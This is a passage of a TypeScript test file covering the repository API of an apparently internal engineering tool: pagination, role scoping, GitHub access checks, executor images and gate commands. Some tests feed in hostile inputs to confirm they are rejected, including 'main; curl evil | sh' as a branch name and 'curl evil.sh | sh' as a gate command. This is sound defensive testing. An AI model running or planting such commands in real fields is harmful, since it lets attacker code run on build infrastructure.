// Import the real schema from the subpath so it is not intercepted by the
// barrel mock below (the subpath has no PrismaClient dependency).
import { ConnectionTypeSchema } from '@auto-swe/shared/lib/connectionTypes';
import Fastify from 'fastify';
import { serializerCompiler, validatorCompiler } from 'fastify-type-provider-zod';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

// repositories.ts only uses `DB_NULL` and connection token helpers at
// runtime; mocking the barrel avoids instantiating the real PrismaClient
// singleton (which requires DATABASE_URL at import) — same pattern as
// humanSteps.test.ts / slack.test.ts.
const DB_NULL = vi.hoisted(() => ({ __sentinel: 'DB_NULL' }));
vi.mock('@auto-swe/shared', () => ({
  ConnectionTypeSchema,
  encryptConnectionApiToken: (token: string) => ({
    apiKeyAuthTag: Buffer.from('auth-tag'),
    apiKeyCiphertext: Buffer.from(`cipher-${token}`),
    apiKeyNonce: Buffer.from('nonce'),
    apiKeyVersion: 1,
  }),
  Prisma: {
    DbNull: DB_NULL,
    sql: (strings: TemplateStringsArray, ...values: unknown[]) => ({
      strings: [...strings],
      values,
    }),
  },
  Role: { ADMIN: 'ADMIN', ENGINEER: 'ENGINEER', LEAD: 'LEAD' },
}));

// URL normalisation compares overrides with the instance's own GitHub hosts;
// stub the config read so it never reaches the database.
const instance = vi.hoisted(() => ({
  apiUrl: 'https://api.github.com',
  baseUrl: 'https://github.com',
}));
vi.mock('@auto-swe/shared/lib/systemConfig', () => ({
  resolveGitHubConfig: async () => ({ ...instance }),
}));

// The caller's own GitHub access, asked before a non-admin onboards. Defaults
// to a linked login with read access; the onboarding-access tests override it.
const github = vi.hoisted(() => ({
  lookupRepoPermission: vi.fn(),
  verifiedGithubLoginFor: vi.fn(),
}));
vi.mock('@auto-swe/shared/lib/repoPermission', () => ({
  lookupRepoPermission: (...a: unknown[]) => github.lookupRepoPermission(...a),
  verifiedGithubLoginFor: (...a: unknown[]) => github.verifiedGithubLoginFor(...a),
}));

import { repositoryRoutes } from './repositories.js';

interface AuthState {
  role: 'ADMIN' | 'LEAD' | 'ENGINEER';
  sub: string;
}

async function buildApp() {
  const app = Fastify();
  app.setValidatorCompiler(validatorCompiler);
  app.setSerializerCompiler(serializerCompiler);

  const authState: AuthState = { role: 'ADMIN', sub: 'admin-1' };

  const mockPrisma = {
    $transaction: vi.fn(async (fn: (tx: unknown) => unknown) =>
      fn({
        $queryRaw: vi.fn(),
        connection: { update: (...args: unknown[]) => mockPrisma.connection.update(...args) },
        connectionTeamShare: { deleteMany: vi.fn() },
        knowledgeItem: { count: (...args: unknown[]) => mockPrisma.knowledgeItem.count(...args) },
        team: { findUnique: (...args: unknown[]) => mockPrisma.team.findUnique(...args) },
      })
    ),
    configAuditLog: { create: vi.fn().mockResolvedValue({}) },
    connection: {
      count: vi.fn(),
      create: vi.fn(),
      findFirst: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
    },
    connectionTeamShare: { deleteMany: vi.fn() },
    knowledgeItem: { count: vi.fn().mockResolvedValue(0) },
    team: {
      findUnique: vi.fn(),
    },
    teamMembership: {
      findUnique: vi.fn(),
    },
  };

  const mockAuth = {
    verifyAccessToken: () => ({
      exp: 9999999999,
      iat: 0,
      role: authState.role,
      sub: authState.sub,
    }),
  };

  const mockTemporal = { probeExecutorImage: vi.fn() };

  app.decorate('prisma', mockPrisma as unknown as never);
  app.decorate('auth', mockAuth as unknown as never);
  app.decorate('temporal', mockTemporal as unknown as never);

  await app.register(repositoryRoutes, { prefix: '/api/v1/repositories' });
  await app.ready();

  return { app, authState, mockPrisma, mockTemporal };
}

const AUTH_HEADER = { authorization: 'Bearer fake-jwt' };
const TEAM_ID = '22222222-2222-4222-8222-222222222222';
const REPO_ID = '33333333-3333-4333-8333-333333333333';

function p2002(target: string[]) {
  return Object.assign(new Error('Unique constraint failed'), {
    code: 'P2002',
    meta: { target },
  });
}

describe('repositoryRoutes', () => {
  let ctx: Awaited<ReturnType<typeof buildApp>>;

  beforeAll(async () => {
    ctx = await buildApp();
  });
  afterAll(() => ctx.app.close());
  beforeEach(() => {
    ctx.authState.role = 'ADMIN';
    ctx.authState.sub = 'admin-1';
    ctx.mockPrisma.$transaction.mockClear();
    ctx.mockPrisma.knowledgeItem.count.mockReset().mockResolvedValue(0);
    ctx.mockPrisma.connectionTeamShare.deleteMany.mockReset();
    ctx.mockPrisma.connection.count.mockReset();
    ctx.mockPrisma.connection.create.mockReset();
    ctx.mockPrisma.connection.findFirst.mockReset();
    ctx.mockPrisma.connection.findMany.mockReset();
    ctx.mockPrisma.connection.findUnique.mockReset();
    ctx.mockPrisma.connection.update.mockReset();
    ctx.mockPrisma.team.findUnique.mockReset();
    ctx.mockPrisma.teamMembership.findUnique.mockReset();
    ctx.mockPrisma.configAuditLog.create.mockClear();
    github.verifiedGithubLoginFor.mockReset().mockResolvedValue('octocat');
    github.lookupRepoPermission.mockReset().mockResolvedValue({ ok: true, permission: 'read' });
  });

  describe('GET /api/v1/repositories', () => {
    it('returns a paginated list with meta.total/limit/offset', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
        { id: 'repo-1', repoName: 'alpha', teamId: TEAM_ID },
        { id: 'repo-2', repoName: 'beta', teamId: TEAM_ID },
      ]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(2);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.payload);
      expect(body.data).toHaveLength(2);
      // Defaults from paginationQuery({ defaultLimit: 200, maxLimit: 500 }).
      expect(body.meta).toEqual({ limit: 200, offset: 0, total: 2 });
    });

    it('passes executorImageBuild through on list rows', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
        {
          executorImageBuild: { stack: 'node', useRepoDockerfile: true },
          id: 'repo-1',
          repoName: 'alpha',
          teamId: TEAM_ID,
        },
      ]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(1);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data[0].executorImageBuild).toEqual({
        stack: 'node',
        useRepoDockerfile: true,
      });
    });

    it('honors explicit limit/offset query params', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(50);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=10&offset=20',
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).meta).toEqual({ limit: 10, offset: 20, total: 50 });
      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs).toMatchObject({ skip: 20, take: 10 });
    });

    it('narrows the list with q, keeping the access filter', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?q=pay',
      });

      expect(res.statusCode).toBe(200);
      const where = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where;
      expect(where.AND[0]).toEqual({ isActive: true });
      expect(where.AND[1].OR).toContainEqual({
        repoName: { contains: 'pay', mode: 'insensitive' },
      });
      expect(ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0].where).toEqual(where);
    });

    it('does not scope the where clause to a team for an ADMIN', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({ isActive: true });
      const countArgs = ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0];
      expect(countArgs.where).toEqual({ isActive: true });
    });

    it('scopes the where clause to the caller’s teams for a non-ADMIN', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      // The caller's own teams, or a team the repository is shared with.
      const member = { memberships: { some: { userId: 'engineer-7' } } };
      expect(findManyArgs.where).toEqual({
        AND: [{ OR: [{ team: member }, { shares: { some: { team: member } } }] }, {}],
        isActive: true,
      });
    });

    it('includes deactivated connections for a LEAD+ caller that asks for them', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({});
    });

    it('shows a platform LEAD deactivated connections only on teams they lead', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-3';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      const member = { memberships: { some: { userId: 'lead-3' } } };
      expect(findManyArgs.where).toEqual({
        AND: [
          // Reachability: their own teams, or a team the repository is shared with.
          { AND: [{ OR: [{ team: member }, { shares: { some: { team: member } } }] }, {}] },
          // Active rows on any of those; inactive rows only where they are team
          // LEAD/ADMIN and so could reactivate them.
          {
            OR: [
              { isActive: true },
              {
                team: {
                  memberships: { some: { role: { in: ['LEAD', 'ADMIN'] }, userId: 'lead-3' } },
                },
              },
            ],
          },
        ],
      });
      expect(ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0].where).toEqual(
        findManyArgs.where
      );
    });

    it('ignores includeInactive for an ENGINEER, and treats "false" as false', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValue([]);
      ctx.mockPrisma.connection.count.mockResolvedValue(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where).toMatchObject({
        isActive: true,
      });

      ctx.authState.role = 'ADMIN';
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=false',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where).toEqual({
        isActive: true,
      });
    });

    it('returns 400 when limit exceeds maxLimit', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=501',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.findMany).not.toHaveBeenCalled();
    });

    it('returns 400 for a negative offset', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?offset=-1',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'GET',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });
  });

  describe('POST /api/v1/repositories', () => {
    it('rejects a defaultBranch that is not a valid git ref name (400)', async () => {
      const res = await ctx.app.inject({
        body: {
          defaultBranch: 'main; curl evil | sh',
          organizationName: 'acme',
          repoName: 'api',
          teamId: TEAM_ID,
        },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('refuses to create an MCP connection through the repository path (400)', async () => {
      const res = await ctx.app.inject({
        body: { config: { url: 'http://mcp.internal' }, teamId: TEAM_ID, type: 'mcp' },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
    const validBody = {
      organizationName: 'acme',
      repoName: 'widgets',
      teamId: TEAM_ID,
      type: 'git_repo',
    };

    it("clears an override spelling out the instance's host however that host is configured", async () => {
      // `resolveGitHubConfig` is DB-primary with an environment fallback, so a
      // host configured only through the environment resolves the same way.
      Object.assign(instance, { apiUrl: 'https://ghe.corp/api/v3', baseUrl: 'https://ghe.corp' });
      try {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: {
            ...validBody,
            githubApiUrl: 'https://ghe.corp/api/v3',
            githubUrl: 'https://ghe.corp',
          },
          url: '/api/v1/repositories',
        });
        expect(res.statusCode).toBe(201);
        expect(ctx.mockPrisma.connection.create).toHaveBeenCalledWith(
          expect.objectContaining({
            data: expect.objectContaining({ githubApiUrl: null, githubUrl: null }),
          })
        );
      } finally {
        Object.assign(instance, {
          apiUrl: 'https://api.github.com',
          baseUrl: 'https://github.com',
        });
      }
    });

    it('onboards a repository and returns 201', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({
        id: REPO_ID,
        organizationName: 'acme',
        repoName: 'widgets',
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
      expect(JSON.parse(res.payload).data.id).toBe(REPO_ID);
      // Identity is (host, owner, name); no override means the instance's host,
      // which a row spelling that host out also is.
      expect(ctx.mockPrisma.connection.findFirst).toHaveBeenCalledWith({
        where: {
          OR: [{ githubUrl: null }, { githubUrl: 'https://github.com' }],
          organizationName: { equals: 'acme', mode: 'insensitive' },
          repoName: { equals: 'widgets', mode: 'insensitive' },
          type: 'git_repo',
        },
      });
      expect(ctx.mockPrisma.connection.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({ githubApiUrl: null, githubUrl: null }),
        })
      );
    });

    it('returns 409 REPO_EXISTS on the friendly pre-check duplicate (no create call)', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce({ id: 'existing-repo' });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('returns 409 REPO_EXISTS (not 500) when create races past the pre-check into a P2002', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockRejectedValueOnce(
        p2002(['organizationName', 'repoName'])
      );

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
    });

    it('returns 400 VALIDATION_ERROR when a git_repo is missing organizationName/repoName', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { teamId: TEAM_ID, type: 'git_repo' },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(400);
      expect(JSON.parse(res.payload).error.code).toBe('VALIDATION_ERROR');
      expect(ctx.mockPrisma.team.findUnique).not.toHaveBeenCalled();
    });

    it('returns 404 TEAM_NOT_FOUND when the team is missing or inactive', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('TEAM_NOT_FOUND');
    });

    it('returns 403 for a platform LEAD who does not lead the target team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null); // no membership in this team

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('allows a LEAD who does lead the target team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce({
        role: 'LEAD',
        team: { isActive: true },
      });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
    });

    it('returns 400 for a missing teamId', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { organizationName: 'acme', repoName: 'widgets', type: 'git_repo' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 400 for an invalid githubUrl', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { ...validBody, githubUrl: 'not-a-url' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 403 for a non-LEAD (ENGINEER) caller', async () => {
      ctx.authState.role = 'ENGINEER';

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.team.findUnique).not.toHaveBeenCalled();
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });

    describe("the caller's own GitHub access", () => {
      const onboardAsTeamLead = () => {
        ctx.authState.role = 'LEAD';
        ctx.authState.sub = 'lead-1';
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce({
          role: 'LEAD',
          team: { isActive: true },
        });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
        return ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: validBody,
          url: '/api/v1/repositories',
        });
      };

      it('is not asked of a platform admin', async () => {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });

        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: validBody,
          url: '/api/v1/repositories',
        });

        expect(res.statusCode).toBe(201);
        expect(github.verifiedGithubLoginFor).not.toHaveBeenCalled();
        expect(github.lookupRepoPermission).not.toHaveBeenCalled();
      });

      it('lets a team lead who can read the repository on GitHub onboard it', async () => {
        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(201);
        expect(github.verifiedGithubLoginFor).toHaveBeenCalledWith(ctx.mockPrisma, 'lead-1');
        expect(github.lookupRepoPermission).toHaveBeenCalledWith(
          {
            githubApiUrl: null,
            githubUrl: null,
            installation: null,
            organizationName: 'acme',
            repoName: 'widgets',
          },
          'octocat'
        );
      });

      it('refuses a team lead GitHub reports has no access (403)', async () => {
        github.lookupRepoPermission.mockResolvedValue({ ok: true, permission: 'none' });

        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
        // Refused before the duplicate check, so the answer says nothing about
        // whether the repository is already onboarded.
        expect(ctx.mockPrisma.connection.findFirst).not.toHaveBeenCalled();
      });

      it('refuses a team lead with no linked GitHub identity (403)', async () => {
        github.verifiedGithubLoginFor.mockResolvedValue(null);

        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');
        expect(github.lookupRepoPermission).not.toHaveBeenCalled();
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });

      it('fails closed when GitHub cannot be asked', async () => {
        github.lookupRepoPermission.mockResolvedValue({ failure: 'unavailable', ok: false });
        const outage = await onboardAsTeamLead();
        expect(outage.statusCode).toBe(503);
        expect(JSON.parse(outage.payload).error.code).toBe('GITHUB_UNAVAILABLE');

        github.lookupRepoPermission.mockRejectedValue(new Error('database down'));
        const thrown = await onboardAsTeamLead();
        expect(thrown.statusCode).toBe(503);

        // The platform credential cannot see the repository: not an outage, and
        // not a yes either.
        github.lookupRepoPermission.mockResolvedValue({ failure: 'repo-not-found', ok: false });
        const unseen = await onboardAsTeamLead();
        expect(unseen.statusCode).toBe(403);
        expect(JSON.parse(unseen.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');

        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });
    });
  });

  describe('executor image', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamLead = () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'LEAD',
        team: { isActive: true },
      });
    };

    it('refuses a team lead any new image: it would hold the credential', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });

      const res = await patch({ executorImage: 'attacker/evil:1' });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('EXECUTOR_IMAGE_NOT_ALLOWED');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a team lead onboarding a repository with an image', async () => {
      asTeamLead();
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {
          executorImage: 'attacker/evil:1',
          organizationName: 'acme',
          repoName: 'api',
          teamId: TEAM_ID,
        },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('lets a team lead re-save the image an admin chose, and clear it', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'registry.acme.dev/custom:2026-10-01',
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const same = await patch({
        description: 'edited',
        executorImage: 'registry.acme.dev/custom:2026-10-01',
      });
      const blank = await patch({ executorImage: '  ' });

      expect(same.statusCode).toBe(200);
      expect(blank.statusCode).toBe(200);
      const cleared = ctx.mockPrisma.connection.update.mock.calls[1]?.[0] as {
        data: { executorImage: unknown };
      };
      expect(cleared.data.executorImage).toBeNull();
    });

    it('lets an admin set image + build together, and clears it on image/build changes', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'registry.acme.dev/custom:1',
        executorImageBuild: { stack: 'node', useRepoDockerfile: false },
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
      const BUILD = { stack: 'python', useRepoDockerfile: true };
      const lastData = () =>
        (
          ctx.mockPrisma.connection.update.mock.calls.at(-1) as unknown as [
            { data: Record<string, unknown> },
          ]
        )[0].data;

      const set = await patch({
        executorImage: 'registry.acme.dev/new:1',
        executorImageBuild: BUILD,
      });
      expect(set.statusCode).toBe(200);
      expect(lastData().executorImageBuild).toEqual(BUILD);

      await patch({ executorImageBuild: null });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: null });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: 'registry.acme.dev/other:1' });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: 'registry.acme.dev/custom:1' });
      expect('executorImageBuild' in lastData()).toBe(false);
    });

    it('refuses a non-admin setting a build, but allows clearing one', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const denied = await patch({
        executorImageBuild: { stack: 'node', useRepoDockerfile: false },
      });
      expect(denied.statusCode).toBe(403);
      expect(JSON.parse(denied.payload).error.code).toBe('EXECUTOR_IMAGE_NOT_ALLOWED');

      const cleared = await patch({ executorImageBuild: null });
      expect(cleared.statusCode).toBe(200);
    });

    it('lets a platform admin set any image reference, but not a malformed one', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const ok = await patch({ executorImage: 'registry.acme.dev/custom:2026-10-01' });
      const bad = await patch({ executorImage: 'node:26 --privileged' });

      expect(ok.statusCode).toBe(200);
      expect(bad.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalledTimes(1);
    });
  });

  describe('gate commands', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const stored = (gateCommands: unknown, type = 'git_repo') =>
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        gateCommands,
        id: REPO_ID,
        teamId: TEAM_ID,
        type,
      });
    const written = (): Record<string, unknown> => {
      const call = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as
        | { data: Record<string, unknown> }
        | undefined;
      if (!call) {
        throw new Error('expected an update');
      }
      return call.data;
    };

    beforeEach(() => {
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    });

    it('refuses a team lead a new command: it runs in every run on the repository', async () => {
      asTeamMember('LEAD');
      stored(null);
      const res = await patch({ gateCommands: { runTests: 'curl evil.sh | sh' } });
      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error).toEqual({
        code: 'GATE_COMMANDS_FORBIDDEN',
        message: "Changing a repository's gate commands requires team-admin role",
      });
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a team lead clearing the commands an admin set', async () => {
      asTeamMember('LEAD');
      stored({ runTests: 'npm test' });
      const res = await patch({ gateCommands: null });
      expect(res.statusCode).toBe(403);
    });

    it('lets a team lead re-save the stored commands with an edit elsewhere', async () => {
      asTeamMember('LEAD');
      stored({ runLint: 'npm run lint', runTests: 'npm test' });
      const res = await patch({
        description: 'edited',
        gateCommands: { runBuild: '  ', runLint: 'npm run lint', runTests: 'npm test' },
      });
      expect(res.statusCode).toBe(200);
      expect(written()).not.toHaveProperty('gateCommands');
      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
    });

    it('lets a team admin set them, dropping blank gates, and audits the change', async () => {
      asTeamMember('ADMIN');
      stored({ runTests: 'npm test' });
      const res = await patch({
        gateCommands: { runBuild: '', runLint: 'pnpm lint', runTests: null },
      });
      expect(res.statusCode).toBe(200);
      expect(written().gateCommands).toEqual({ runLint: 'pnpm lint' });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
